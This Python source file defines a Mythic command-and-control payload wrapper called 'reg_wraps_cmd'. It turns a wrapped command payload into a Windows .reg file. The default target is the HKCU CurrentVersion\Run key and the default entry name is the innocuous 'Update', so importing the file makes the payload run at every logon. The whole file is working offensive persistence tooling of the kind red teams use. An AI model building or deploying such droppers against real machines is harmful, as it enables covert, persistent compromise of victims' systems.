import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class reg_wraps_cmd(PayloadType):
    name = "reg_wraps_cmd"
    file_extension = "reg"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["powershell_to_cmd"]
    note = """Creates a REG file which executes creates a registry key with the command"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "clickable"
    agent_icon_path = agent_path / "agent_functions" / "click.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "registry_key",
            parameter_type=BuildParameterType.String,
            default_value="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            description="Defines the registry key where the key=value will be created",
        ),
        BuildParameter(
            name = "entry",
            parameter_type=BuildParameterType.String,
            default_value="Update",
            description="Entry name",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            cmd_payload = self.wrapped_payload.decode()
            cmd_payload = cmd_payload.replace('"', '\\"')

            payload = """Windows Registry Editor Version 5.00

[{registry_key}]
"{entry}"="{payload}"
"""

            resp.payload = payload.format(registry_key=self.get_parameter('registry_key'), entry=self.get_parameter('entry'), payload=cmd_payload)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
